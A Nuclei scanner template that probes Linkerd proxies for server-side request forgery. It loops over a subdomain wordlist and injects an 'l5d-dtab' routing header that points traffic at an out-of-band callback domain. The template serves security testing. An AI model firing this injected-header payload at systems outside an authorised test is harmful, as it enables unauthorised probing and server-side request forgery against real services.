# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: linkerd-ssrf-detection
info:
  name: Linkerd SSRF detection
  author: dudez
  severity: high
  tags: ssrf,linkerd,oob
  reference: https://twitter.com/nirvana_msu/status/1084144955034165248
http:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt

    threads: 100
    raw:
      - |
        GET / HTTP/1.1
        Host: {{Subdomains}}
        Accept-Encoding: gzip, deflate
        l5d-dtab: /svc/* => /$/inet/{{Host}}.{{Port}}.{{Subdomains}}.linkerd.{{MY-DOMAIN}}/443
